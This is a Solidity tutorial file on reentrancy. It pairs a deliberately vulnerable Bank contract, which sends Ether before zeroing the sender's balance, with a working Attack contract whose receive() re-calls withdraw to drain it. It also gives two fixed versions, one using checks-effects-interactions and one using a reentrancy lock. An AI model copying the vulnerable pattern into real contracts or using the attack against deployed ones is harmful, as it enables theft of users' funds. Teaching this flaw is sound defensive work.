// SPDX-License-Identifier: MIT
// by 0xAA
// english translation by 22X
pragma solidity ^0.8.21;

contract Bank {
    mapping (address => uint256) public balanceOf;    // Balance mapping

    // Deposit Ether and update balance
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all Ether from msg.sender
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // Get balance
        require(balance > 0, "Insufficient balance");
        // Transfer Ether !!! May trigger the fallback/receive function of a malicious contract, posing a reentrancy risk!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // Update balance
        balanceOf[msg.sender] = 0;
    }

    // Get the balance of the bank contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; // Address of the Bank contract

    // Initialize the address of the Bank contract
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // Callback function used for reentrancy attack on the Bank contract, repeatedly calling the target's withdraw function
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // Attack function, msg.value should be set to 1 ether when calling
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Get the balance of this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Use Checks-Effects-Interactions pattern to prevent reentrancy attack
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Checks-Effects-Interactions pattern: update balance change first, then send ETH
        // In case of reentrancy attack, balanceOf[msg.sender] has already been updated to 0, so it cannot pass the above check.
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Use reentrant lock to prevent reentrancy attack
contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    uint256 private _status; // reentrant lock

    // reentrant lock
    modifier nonReentrant() {
        // _status will be 0 on the first call to nonReentrant
        require(_status == 0, "ReentrancyGuard: reentrant call");
        // Any subsequent calls to nonReentrant will fail
        _status = 1;
        _;
        // Call ends, restore _status to 0
        _status = 0;
    }


    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Protect vulnerable function with reentrant lock
    function withdraw() external nonReentrant{
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

